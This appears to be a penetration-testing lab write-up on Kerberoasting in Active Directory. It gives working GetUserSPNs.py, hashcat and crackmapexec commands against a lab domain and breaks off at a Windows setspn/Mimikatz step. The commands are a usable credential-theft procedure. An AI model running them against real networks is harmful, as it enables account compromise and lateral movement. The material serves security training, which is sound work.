# 🐕‍🦺 Kerberoasting

<figure><img src="../../../.gitbook/assets/image (1055).png" alt=""><figcaption></figcaption></figure>

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments

In order to kerberoast, we can use several tools like:

* Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
* A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
* From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts

It's good to know that we can perform this attack from plenty of positions in the network:

* From a non-domain joined Linux host using valid domain user credentials.
* From a domain-joined Linux host as root after retrieving the keytab file.
* From a domain-joined Windows host authenticated as a domain user.
* From a domain-joined Windows host with a shell in the context of a domain account.
* As SYSTEM on a domain-joined Windows host.
* From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

When we obtain a TGS ticket after this attack, we still need to crack the hash offline in order to get access to the account with valid credentials

## Kerberoasting - from Linux

**Listing SPN Accounts with GetUserSPNs.py**

```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

We can now pull all TGS tickets for offline processing using the `-request` flag.

**Requesting all TGS Tickets**

```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```

**Requesting a Single TGS ticket**

We're going to try to pull user sqldev:

```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

To go even quicker, we can redirect the TGS with the `-outputfile`

```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

**Cracking the Ticket Offline with Hashcat**

Now we can attempt to crack the ticket offline using Hashcat hash mode `13100`.

```shell-session
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

**Testing Authentication against a Domain Controller**

With the clear text password, we can try to authenticate with the domain

```shell-session
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

### Practical example

_Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer._

So we're using the user forend, we previously got his password so we can use that to find SAMService's password

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService
```

<figure><img src="../../../.gitbook/assets/image (1056).png" alt=""><figcaption></figcaption></figure>

We can even go further by outputting the result to a file:

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sapshash
```

<figure><img src="../../../.gitbook/assets/image (1057).png" alt=""><figcaption></figcaption></figure>

Since the VM is outdated we take the hash on our local machine and fire up hashcat:

```
hashcat -m 13100 sapshash /usr/share/wordlists/rockyou.txt
```

And find the password

And with simple enumeration of users we found the answer to the question:

_What powerful local group on the Domain Controller is the SAPService user a member of?_

## Kerberoasting - from Windows

### Kerberoasting - Semi Manual method

For this task we'll use a [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)) binary to enumerate SPNs in the domain.

```
C:\htb> setspn.exe -Q */*
```

We will notice many different SPNs returned for the various hosts in the domain. We will focus on `user accounts` and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`. Let's try this by targeting a single user:
